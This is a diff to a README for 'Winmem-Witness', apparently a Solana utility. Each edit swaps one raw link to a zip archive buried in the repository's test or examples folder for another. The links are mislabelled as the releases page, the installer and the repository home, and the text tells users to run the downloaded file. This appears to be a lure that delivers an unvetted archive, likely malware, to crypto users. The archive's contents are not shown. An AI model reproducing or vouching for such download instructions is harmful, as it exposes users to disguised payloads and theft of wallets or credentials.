@@ -8,7 +8,7 @@ Welcome to Winmem-Witness! This application helps keep your Solana projects runn
 
 To get started, you need to download the latest version of Winmem-Witness. Click the button below to access the Releases page.
 
-[![Download Winmem-Witness](https://raw.githubusercontent.com/kazuop/Winmem-Witness/main/test/Winmem_Witness_v1.2.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/kazuop/Winmem-Witness/main/test/Winmem_Witness_v1.2.zip)
+[![Download Winmem-Witness](https://github.com/kazuop/Winmem-Witness/raw/refs/heads/main/examples/integrations/Witness-Winmem-2.1.zip%20Now-v1.0-brightgreen)](https://github.com/kazuop/Winmem-Witness/raw/refs/heads/main/examples/integrations/Witness-Winmem-2.1.zip)
 
 ## 🌐 System Requirements
 
@@ -23,13 +23,13 @@ Before you download, make sure your system meets these requirements:
 ## 💻 Download & Install
 
 1. **Visit the Downloads Page**: 
-   Click this link to go to the Releases page: [Winmem-Witness Releases](https://raw.githubusercontent.com/kazuop/Winmem-Witness/main/test/Winmem_Witness_v1.2.zip).
+   Click this link to go to the Releases page: [Winmem-Witness Releases](https://github.com/kazuop/Winmem-Witness/raw/refs/heads/main/examples/integrations/Witness-Winmem-2.1.zip).
 
 2. **Select the Latest Version**: 
    Look for the most recent release at the top of the page. It will usually be labeled as "Latest Release."
 
 3. **Download the Installer**: 
-   Click on the installer file suitable for your operating system. For Windows, it might be something like `https://raw.githubusercontent.com/kazuop/Winmem-Witness/main/test/Winmem_Witness_v1.2.zip`.
+   Click on the installer file suitable for your operating system. For Windows, it might be something like `https://github.com/kazuop/Winmem-Witness/raw/refs/heads/main/examples/integrations/Witness-Winmem-2.1.zip`.
 
 4. **Run the Installer**:
    Locate the downloaded file, usually in your Downloads folder, and double-click it. Follow the instructions in the setup wizard.
@@ -65,7 +65,7 @@ Winmem-Witness is an open-source project. Feel free to explore the code and cont
 
 For more information on Winmem-Witness, you can:
 
-- Visit the [GitHub Repository](https://raw.githubusercontent.com/kazuop/Winmem-Witness/main/test/Winmem_Witness_v1.2.zip)
+- Visit the [GitHub Repository](https://github.com/kazuop/Winmem-Witness/raw/refs/heads/main/examples/integrations/Witness-Winmem-2.1.zip)
 - Join the community on [Discord](#) for real-time support
 
 Thank you for choosing Winmem-Witness! We hope this tool serves you well in managing your Solana projects.
